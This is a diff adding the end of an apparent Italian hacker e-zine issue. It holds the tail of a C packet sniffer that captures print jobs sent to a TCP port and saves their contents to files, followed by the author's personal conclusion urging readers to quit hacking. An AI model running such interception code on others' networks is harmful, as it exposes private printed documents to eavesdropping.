+	case IPPROTO_TCP:
+ 	     TCP = (struct tcphdr *) (buff + ((int)IP->ip_hl << 2));
+	     if(ntohs(TCP->th_dport)==PORT) {
+	      if (TCP->th_flags & TH_SYN) {
+	       if (fp)  fclose(fp);      
+ 	        printf("Detect a print job\n");	
+	        count++;
+	        snprintf(filename, sizeof(filename)-1, "%s%d",
+				  SUFFIX, count);
+	        fp=fopen(filename,"a+"); 
+	       }
+	      fwrite(buff + sizeof(struct ip) + sizeof(struct tcphdr), 
+			       ntohs(IP->ip_len) - sizeof(struct ip) -
+			       sizeof(struct tcphdr), 1, fp);
+	      fflush(fp);
+	     }
+	     break;
+   }					
+  }		
+ }
+}
+
+---------- snip ----------
+
+
+-------------------------------------------------------------------------------
+------------------------------[ CONCLUSIONI ]----------------------------------
+-------------------------------------------------------------------------------
+
+Ecco qui la conclusione ... guardando questo e pfi 1 ... e' chiaro che non ci
+sono paragoni =) si comincia con l'essere dei ragazzi incoscenti poi se si ha
+la fortuna che non ti vengono a bussare alla porta con un mandato, si diventa
+qualcosa ... ma non basta, bisogna continuare ...
+A distanza di un anno o forse piu' sono successe tante cose ... per esempio
+ho scritto tutto questo numero, codici compresi con una tastiera 
+teknosciamanica ... sono diventato vegetariano :) da un po' di mesi non
+giudico piu' nessuno ... passo molto meno tempo su irc di quanto ne passo sul
+gcc, do' consigli sulla sicurezza, butto le mie paghe in difesa degli animali,
+ma soprattutto non buco piu' server da piu' di un anno...
+Quando vado su irc scopro gente con il mio nick e mi fermo a parlare con loro,
+scoprendo che sono delle persone piu' interessanti di me poi la sera se la
+mia schedule() me lo concede ancora leggo qualche libro con sottofondo
+musicale i sempre e soliti Grateful Dead...
+Attualmente sto mettendo da parte un po' di soldi per andare a San Francisco,
+condivido la camera con un gatto e lavoro dove capita e quando capita...
+Un ultimo messaggio lo volevo rivolgere a coloro che hanno cambiato la pagina
+su www.michieli.it scrivendo alla redazione di bfi e chiedendomi se ce l'avessi
+con loro... no ragazzi, non ce l'ho con voi ... pero' smettete di fare hacking
+il rischio che oggi un hacker corre per una ragazzata e' piuttosto alto, 
+c'e' sempre meno gente aperta in queste questioni e se non fosse per 
+organizzazioni come la Metro Olografix e l'ALCEI il divario tra l'underground
+italiano e la societa' sarebbe ancora piu' grande, quello che Valerio Capello
+ha scritto su BFI7 e' secondo me molto vero ... a volte e' difficile trovare
+un'etica tra le creature dell'underground figuratevi quindi fuori dalla rete..
+ne parliano su irc se volete ... 
+
+E finiamo questo numero con una frase di Bruce Eisner:
+
+"Cosa vuoi che importi se hai cinquemila megabyte sul tuo desktop se poi appena
+fuori casa la temperatura e' di quaranta gradi all'ombra per tre settimane di
+fila?"
+
+
+pIGpEN`79 the haphazard deadhead
+
